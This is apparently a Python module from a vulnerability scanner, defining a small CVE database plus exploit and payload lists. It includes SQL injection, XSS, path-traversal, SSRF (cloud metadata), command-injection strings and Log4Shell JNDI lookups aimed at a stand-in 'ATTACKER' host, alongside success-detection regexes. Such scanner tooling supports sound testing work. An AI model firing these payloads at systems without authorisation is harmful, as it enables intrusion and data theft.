"""Vulnerability database and exploit knowledge base."""
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any
import re


@dataclass
class Vulnerability:
    """Vulnerability definition."""
    id: str  # CVE-XXXX-XXXX or custom ID
    name: str
    severity: str  # critical, high, medium, low
    cvss: float = 0.0
    description: str = ""
    affected: List[str] = field(default_factory=list)  # affected products/versions
    references: List[str] = field(default_factory=list)
    remediation: str = ""
    tags: List[str] = field(default_factory=list)


@dataclass
class Exploit:
    """Exploit definition."""
    id: str
    vuln_id: str  # Reference to vulnerability
    name: str
    exploit_type: str  # rce, sqli, xss, lfi, ssrf, etc.
    payload: str = ""
    check_pattern: str = ""  # Regex to verify success
    requirements: List[str] = field(default_factory=list)
    reliability: str = "medium"  # high, medium, low


class VulnDB:
    """In-memory vulnerability and exploit database."""

    def __init__(self):
        self.vulns: Dict[str, Vulnerability] = {}
        self.exploits: Dict[str, Exploit] = {}
        self._load_builtin()

    def _load_builtin(self):
        """Load built-in vulnerability signatures."""
        # Web vulnerabilities
        self._add_vuln(Vulnerability(
            id="WEB-SQLI-001", name="SQL Injection", severity="high", cvss=8.6,
            description="SQL injection allows attackers to execute arbitrary SQL commands",
            tags=["sqli", "web", "injection"],
            remediation="Use parameterized queries and input validation"
        ))
        self._add_vuln(Vulnerability(
            id="WEB-XSS-001", name="Cross-Site Scripting (XSS)", severity="high", cvss=6.1,
            description="XSS allows attackers to inject malicious scripts into web pages",
            tags=["xss", "web", "injection"],
            remediation="Encode output and use Content-Security-Policy"
        ))
        self._add_vuln(Vulnerability(
            id="WEB-LFI-001", name="Local File Inclusion", severity="high", cvss=7.5,
            description="LFI allows attackers to read local files on the server",
            tags=["lfi", "web", "file"],
            remediation="Validate and sanitize file paths, use allowlists"
        ))
        self._add_vuln(Vulnerability(
            id="WEB-SSRF-001", name="Server-Side Request Forgery", severity="high", cvss=8.6,
            description="SSRF allows attackers to make requests from the server",
            tags=["ssrf", "web"],
            remediation="Validate URLs and use allowlists for external requests"
        ))
        self._add_vuln(Vulnerability(
            id="WEB-RCE-001", name="Remote Code Execution", severity="critical", cvss=9.8,
            description="RCE allows attackers to execute arbitrary code on the server",
            tags=["rce", "web", "critical"],
            remediation="Sanitize all user input, avoid eval/exec functions"
        ))

        # SSL/TLS vulnerabilities
        self._add_vuln(Vulnerability(
            id="SSL-WEAK-001", name="Weak SSL/TLS Configuration", severity="medium", cvss=5.3,
            description="Server supports deprecated protocols or weak ciphers",
            tags=["ssl", "tls", "crypto"],
            remediation="Disable TLS 1.0/1.1, use strong cipher suites"
        ))
        self._add_vuln(Vulnerability(
            id="SSL-CERT-001", name="Invalid SSL Certificate", severity="medium", cvss=5.9,
            description="SSL certificate is expired, self-signed, or invalid",
            tags=["ssl", "certificate"],
            remediation="Use valid certificates from trusted CAs"
        ))

        # Common CVEs
        self._add_vuln(Vulnerability(
            id="CVE-2021-44228", name="Log4Shell", severity="critical", cvss=10.0,
            description="Apache Log4j2 RCE via JNDI lookup",
            affected=["Apache Log4j 2.0-2.14.1"],
            tags=["rce", "java", "log4j"],
            remediation="Upgrade to Log4j 2.17.0+"
        ))
        self._add_vuln(Vulnerability(
            id="CVE-2017-5638", name="Apache Struts RCE", severity="critical", cvss=10.0,
            description="Apache Struts 2 RCE via Content-Type header",
            affected=["Apache Struts 2.3.5-2.3.31", "Apache Struts 2.5-2.5.10"],
            tags=["rce", "java", "struts"],
            remediation="Upgrade Apache Struts"
        ))
        self._add_vuln(Vulnerability(
            id="CVE-2019-0708", name="BlueKeep", severity="critical", cvss=9.8,
            description="Windows RDP RCE vulnerability",
            affected=["Windows 7", "Windows Server 2008"],
            tags=["rce", "rdp", "windows"],
            remediation="Apply Microsoft security patches"
        ))
        self._add_vuln(Vulnerability(
            id="CVE-2021-26855", name="ProxyLogon", severity="critical", cvss=9.8,
            description="Microsoft Exchange Server SSRF leading to RCE",
            affected=["Microsoft Exchange Server 2013-2019"],
            tags=["ssrf", "rce", "exchange"],
            remediation="Apply Microsoft security patches"
        ))

        # Exploits
        self._add_exploit(Exploit(
            id="EXP-SQLI-001", vuln_id="WEB-SQLI-001", name="Error-based SQLi",
            exploit_type="sqli", payload="' OR '1'='1' --",
            check_pattern=r"SQL syntax|mysql_|ORA-\d+|PostgreSQL"
        ))
        self._add_exploit(Exploit(
            id="EXP-XSS-001", vuln_id="WEB-XSS-001", name="Reflected XSS",
            exploit_type="xss", payload="<script>alert(1)</script>",
            check_pattern=r"<script>alert\(1\)</script>"
        ))
        self._add_exploit(Exploit(
            id="EXP-LFI-001", vuln_id="WEB-LFI-001", name="Path Traversal LFI",
            exploit_type="lfi", payload="../../../etc/passwd",
            check_pattern=r"root:.*:0:0:"
        ))
        self._add_exploit(Exploit(
            id="EXP-LOG4J-001", vuln_id="CVE-2021-44228", name="Log4Shell JNDI",
            exploit_type="rce", payload="${jndi:ldap://ATTACKER/a}",
            check_pattern=r"", requirements=["LDAP server"]
        ))

    def _add_vuln(self, vuln: Vulnerability):
        self.vulns[vuln.id] = vuln

    def _add_exploit(self, exploit: Exploit):
        self.exploits[exploit.id] = exploit

    def get_vuln(self, vuln_id: str) -> Optional[Vulnerability]:
        return self.vulns.get(vuln_id)

    def get_exploit(self, exploit_id: str) -> Optional[Exploit]:
        return self.exploits.get(exploit_id)

    def search_vulns(self, query: str = None, severity: str = None, tags: List[str] = None) -> List[Vulnerability]:
        results = list(self.vulns.values())
        if severity:
            results = [v for v in results if v.severity == severity]
        if tags:
            results = [v for v in results if any(t in v.tags for t in tags)]
        if query:
            q = query.lower()
            results = [v for v in results if q in v.name.lower() or q in v.description.lower()]
        return results

    def get_exploits_for_vuln(self, vuln_id: str) -> List[Exploit]:
        return [e for e in self.exploits.values() if e.vuln_id == vuln_id]

    def get_exploits_by_type(self, exploit_type: str) -> List[Exploit]:
        return [e for e in self.exploits.values() if e.exploit_type == exploit_type]

    def match_banner(self, banner: str) -> List[Vulnerability]:
        """Match vulnerabilities based on service banner."""
        matches = []
        banner_lower = banner.lower()

        patterns = {
            r"apache/2\.4\.[0-4]\d": ["CVE-2021-41773", "CVE-2021-42013"],
            r"nginx/1\.[0-9]\.": [],
            r"openssh[_\s]7\.[0-6]": ["CVE-2018-15473"],
            r"log4j": ["CVE-2021-44228"],
            r"struts": ["CVE-2017-5638"],
        }

        for pattern, cves in patterns.items():
            if re.search(pattern, banner_lower):
                for cve in cves:
                    if cve in self.vulns:
                        matches.append(self.vulns[cve])

        return matches

    def get_payloads(self, vuln_type: str) -> List[str]:
        """Get payloads for a vulnerability type."""
        payloads = {
            "sqli": [
                "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
                "1' AND '1'='1", "' UNION SELECT NULL--", "admin'--"
            ],
            "xss": [
                "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>", "javascript:alert(1)",
                "'><script>alert(1)</script>", "\"><script>alert(1)</script>"
            ],
            "lfi": [
                "../../../etc/passwd", "....//....//etc/passwd",
                "/etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "php://filter/convert.base64-encode/resource=index.php"
            ],
            "ssrf": [
                "http://127.0.0.1", "http://localhost", "http://[::1]",
                "http://169.254.169.254", "http://metadata.google.internal"
            ],
            "rce": [
                "; id", "| id", "` id `", "$(id)", "; whoami", "| whoami"
            ],
            "log4j": [
                "${jndi:ldap://ATTACKER/a}", "${jndi:rmi://ATTACKER/a}",
                "${${lower:j}ndi:${lower:l}dap://ATTACKER/a}"
            ]
        }
        return payloads.get(vuln_type, [])

    def get_detection_patterns(self, vuln_type: str) -> List[str]:
        """Get detection patterns for a vulnerability type."""
        patterns = {
            "sqli": [
                r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
                r"PostgreSQL.*ERROR", r"ORA-\d{5}", r"SQLite.*error",
                r"SQLSTATE\[", r"Unclosed quotation mark"
            ],
            "xss": [
                r"<script>alert\(1\)</script>", r"<img src=x onerror=alert\(1\)>",
                r"<svg onload=alert\(1\)>"
            ],
            "lfi": [
                r"root:.*:0:0:", r"\[boot loader\]", r"PD9waHA"
            ],
            "rce": [
                r"uid=\d+\(", r"root:", r"www-data", r"COMPUTERNAME="
            ]
        }
        return patterns.get(vuln_type, [])
